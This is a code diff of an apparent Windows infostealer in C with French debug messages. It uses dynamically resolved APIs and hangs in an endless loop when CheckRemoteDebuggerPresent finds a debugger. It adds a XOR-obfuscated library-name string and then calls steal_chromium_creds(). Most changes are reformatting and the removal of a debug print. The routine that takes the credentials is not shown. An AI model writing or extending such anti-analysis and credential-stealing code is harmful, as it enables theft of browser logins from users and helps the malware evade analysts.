@@ -20,7 +20,7 @@ int main(void) {
 
   // Init
   hidden_apis apis = {0};
-  resolve_apis(&apis); 
+  resolve_apis(&apis);
 
   // Check if a debugger is attached to the process
   BOOL isDebuggerPresent = FALSE;
@@ -28,30 +28,35 @@ int main(void) {
 
   if (apis.funcCheckRemoteDebuggerPresent) {
     if (apis.funcCheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
-      printf("Nice call\n");
       if (isDebuggerPresent) {
 #ifdef DEBUG
         printf("Un débogueur est détecté sur ce processus.\n");
 #endif
         while (1);
-      } 
-      else {
+      } else {
 #ifdef DEBUG
         printf("Aucun débogueur n'est détecté sur ce processus.\n");
 #endif
       }
-    } 
-    else {
+    } else {
 #ifdef DEBUG
-      printf("Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur : %lu\n", GetLastError());
+      printf(
+          "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur "
+          ": %lu\n",
+          GetLastError());
 #endif
     }
-  } 
-  else {
+  } else {
 #ifdef DEBUG
-    printf("Erreur: CheckRemoteDebuggerPresent n'a pas été résolu correctement.\n");
+    printf(
+        "Erreur: CheckRemoteDebuggerPresent n'a pas été résolu "
+        "correctement.\n");
 #endif
   }
+  char msvcrt_str[] = "\x47\x59\x5c\x49\x58\x5e\x04\x4e\x46\x46";
+  XOR_STR(msvcrt_str, strlen(msvcrt_str));
+
+  // apis.funcLoadLibraryA(msvcrt_str);
 
   steal_chromium_creds();
 
